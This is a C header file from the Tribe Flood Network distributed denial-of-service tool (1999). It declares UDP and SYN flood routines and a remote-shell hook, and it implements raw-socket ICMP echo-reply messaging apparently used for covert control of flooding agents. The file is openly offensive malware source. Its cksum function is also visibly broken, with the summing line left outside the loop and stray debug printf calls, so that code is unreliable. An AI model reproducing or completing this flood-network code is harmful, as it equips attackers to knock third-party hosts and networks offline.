/* tubby.h - tribe flood network include file */

#ifndef TUBBY_H
#define TUBBY_H

#define __FAVOR_BSD
#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/ip_icmp.h>


#if CHILDS > 15
#error "Packet kiddie detected..."
#error "That many childs would crash the host... :)"
#endif

char shameless_self_promotion[] = "[0;35mTribe Flood Network (c) 1999 by [5mMixter[0m\n\n";

#define getrandom(min, max) ((rand() % (int)(((max)+1) - (min))) + (min))
#define mixprintf(a,b,c) snprintf(a,sizeof(a)-1,b,c)
#define mixprintf2(a,b,c,d) snprintf(a,sizeof(a)-1,b,c,d)
#define ANSWER send_connect (ip->saddr, ID_ACK, answer)

void send_connect (unsigned long, unsigned int, char *,int);
u_long syn (char *, u_short);
u_short cksum (u_short *, int);
int udp (char *);
int validip (char *);
char *strfl (void);
void show_shit (char *);
u_long k00lip (void);
char *k00lntoa (void);
void must_kill_all (void);
void commence_udp (char *);
void commence_syn (char *, int);

#ifdef ID_SHELL
void shellsex (int);
#endif

unsigned short
ip_sum (addr, len)
     u_short *addr;
     int len;
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  answer = ~sum;
  return (answer);
}

u_short
cksum (u_short * buf, int nwords)
{
  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)
  printf("%i\n",nwords); 
   sum += *buf++;

     printf("%i\n",nwords);
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);
  return ~sum;
}

int
validip (char *ip)
{
  int a, b, c, d, *x;
  sscanf (ip, "%d.%d.%d.%d", &a, &b, &c, &d);
  x = &a;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &b;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &c;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  x = &d;
  if (*x < 0)
    return 0;
  if (*x > 255)
    return 0;
  sprintf (ip, "%d.%d.%d.%d", a, b, c, d);	// truncate possible garbage data

  return 1;
}

void
send_connect (unsigned long to, unsigned int id, char *data,int sizi)
{
  char buf[1024];
  struct icmp *icmpi = (struct icmp *) buf;
  char *bla = (buf + sizeof (struct icmp));
  struct sockaddr_in sa;
  int i, ssock;
  FILE *fili;
  ssock = socket (AF_INET, SOCK_RAW, 1);
 
  bzero (buf, sizeof(buf));

  icmpi->icmp_type = 0;
  icmpi->icmp_hun.ih_idseq.icd_id = htons (id);
  memcpy(bla,data,sizi);
  icmpi->icmp_cksum = ip_sum ((u_short *) icmpi, 1024);
  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = to;
  i = sendto (ssock, buf, 1024, 0, (struct sockaddr *) &sa, sizeof (sa));
  close (ssock);
}


#endif
